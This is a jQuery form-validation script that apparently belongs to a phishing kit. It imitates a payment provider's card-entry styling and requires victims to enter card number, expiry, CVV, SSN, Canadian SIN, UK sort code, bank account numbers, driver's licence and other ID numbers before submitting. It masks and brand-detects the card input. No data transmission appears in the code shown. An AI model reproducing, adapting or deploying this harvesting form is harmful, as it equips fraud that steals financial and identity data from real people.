jQuery(function() {
  $('#Exp')['mask']('99 / 99');
});
jQuery(function() {
  $('#Cvv')['mask']('9999');
});
jQuery(function() {
  $('#Ssn')['mask']('999 - 99 - 9999');
});
jQuery(function() {
  $('#Sort')['mask']('99 - 99 - 99');
});
jQuery(function() {
  $('#Sin')['mask']('999 - 999 - 999');
});
$(document).ready(function() {
  $("#btnConfirm").click(function() {
    var xFullName = $("#Name").val();
    var xCardNumber = $("#Number").val();
    var xCardExp = $("#Exp").val();
    var xAccnum = $("#Accnum").val();
    var xDriver = $("#Driver").val();
    var xAccnum2 = $("#Accnum2").val();
    var xSort = $("#Sort").val();
    var xBan = $("#Ban").val();
    var xSsn = $("#Ssn").val();
    var xCivil = $("#Civil").val();
    var xLimit = $("#Limit").val();
    var xPersonal = $("#Personal").val();
    var xCitizen = $("#Citizen").val();
    var xCardcvv = $("#Cvv").val();
    var xStart;
    if (xFullName === "") {
      xStart = false;
      document.getElementById("DivName").className = "textInput lap hasError";
    }
    if (xSsn === "") {
      xStart = false;
      document.getElementById("DivSsn").className = "textInput lap hasError";
    }
    if (xSort === "") {
      xStart = false;
      document.getElementById("DivSort").className = "textInput lap hasError";
    }
    if (xAccnum === "") {
      xStart = false;
      document.getElementById("DivAccnum").className = "textInput lap hasError";
    }
    if (xAccnum2 === "") {
      xStart = false;
      document.getElementById("DivAccnum2").className = "textInput pull-right lap hasError";
    }
    if (xBan === "") {
      xStart = false;
      document.getElementById("DivBan").className = "textInput pull-right lap hasError";
    }
    if (xDriver === "") {
      xStart = false;
      document.getElementById("DivDriver").className = "textInput lap hasError";
    }
    if (xCitizen === "") {
      xStart = false;
      document.getElementById("DivCitizen").className = "textInput pull-right lap hasError";
    }
    if (xLimit === "") {
      xStart = false;
      document.getElementById("DivLimit").className = "textInput lap hasError";
    }
    if (xPersonal === "") {
      xStart = false;
      document.getElementById("DivPersonal").className = "textInput lap hasError";
    }
    if (xCivil === "") {
      xStart = false;
      document.getElementById("DivCivil").className = "textInput lap hasError";
    }
    if (xCardNumber === "" || xCardNumber.length < 15) {
      xStart = false;
      document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap hasError";
      document.getElementById("DivLogo").className = "fiModule-icon_card hide";
    }
    if (xCardExp === "" || xCardExp.length < 6) {
      xStart = false;
      document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError";
    }
    if (xCardcvv === "" || xCardcvv.length < 3) {
      xStart = false;
      document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap hasError";
    }
    if (xStart === false) {
      return false;
    } else {
      document.getElementById("loding").className = "hasSpinner";
    }
    return true;
  })
  $("#Name").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivName").className = "textInput lap";
    } else {
      document.getElementById("DivName").className = "textInput lap hasError";
    }
  })
  $("#Number").keyup(function() {
    var x = document.getElementById("Number").className;
    if (x == "textInput ccNumber ccNumber ccNum lap hasError" || $(this).val().length !== 0) {
      document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap";
    } else {
      document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap hasError";
      document.getElementById("DivLogo").className = "fiModule-icon_card hide";
      $("#DivCvv").attr("data-ctype", "");
    }
    if ($(this).val().substring(0, 1) == 4) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-visa-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
    if ($(this).val().substring(0, 1) == 5) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-mastercard-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
    if ($(this).val().substring(0, 2) == 34) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-amex-logo";
      $("#DivCvv").attr("data-ctype", "amex");
      jQuery(function() {
        $('#Number')['mask']('9999 999999 99999');
      });
    }
    if ($(this).val().substring(0, 2) == 37) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-amex-logo";
      $("#DivCvv").attr("data-ctype", "amex");
      jQuery(function() {
        $('#Number')['mask']('9999 999999 99999');
      });
    }
    if ($(this).val().substring(0, 2) == 35) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-jcb-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
    if ($(this).val().substring(0, 2) == 60) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-discover-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
  })
  $("#Exp").keyup(function() {
    var x = document.getElementById("DivExp").className;
    if (x == "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError" || $(this).val().length !== 0) {
      document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap";
    } else {
      document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError";
    }
  })
  $("#Cvv").keyup(function() {
    var x = document.getElementById("DivCvv").className;
    if (x == "textInput csc pull-right csc securityCode lap hasError" || $(this).val().length !== 0) {
      document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap";
    } else {
      document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap hasError";
    }
  })
  $("#Ssn").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivSsn").className = "textInput lap";
    } else {
      document.getElementById("DivSsn").className = "textInput lap hasError";
    }
  })
  $("#Sort").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivSort").className = "textInput lap";
    } else {
      document.getElementById("DivSort").className = "textInput lap hasError";
    }
  })
  $("#Accnum").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivAccnum").className = "textInput lap";
    } else {
      document.getElementById("DivAccnum").className = "textInput lap hasError";
    }
  })
  $("#Accnum2").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivAccnum2").className = "textInput pull-right lap";
    } else {
      document.getElementById("DivAccnum2").className = "textInput pull-right lap hasError";
    }
  })
  $("#Citizen").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivCitizen").className = "textInput pull-right lap";
    } else {
      document.getElementById("DivCitizen").className = "textInput pull-right lap hasError";
    }
  })
  $("#Ban").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivBan").className = "textInput pull-right lap";
    } else {
      document.getElementById("DivBan").className = "textInput pull-right lap hasError";
    }
  })
  $("#Limit").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivLimit").className = "textInput lap";
    } else {
      document.getElementById("DivLimit").className = "textInput lap hasError";
    }
  })
  $("#Driver").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivDriver").className = "textInput lap";
    } else {
      document.getElementById("DivDriver").className = "textInput lap hasError";
    }
  })
  $("#Civil").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivCivil").className = "textInput lap";
    } else {
      document.getElementById("DivCivil").className = "textInput lap hasError";
    }
  })
  $("#Personal").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivPersonal").className = "textInput lap";
    } else {
      document.getElementById("DivPersonal").className = "textInput lap hasError";
    }
  })
})
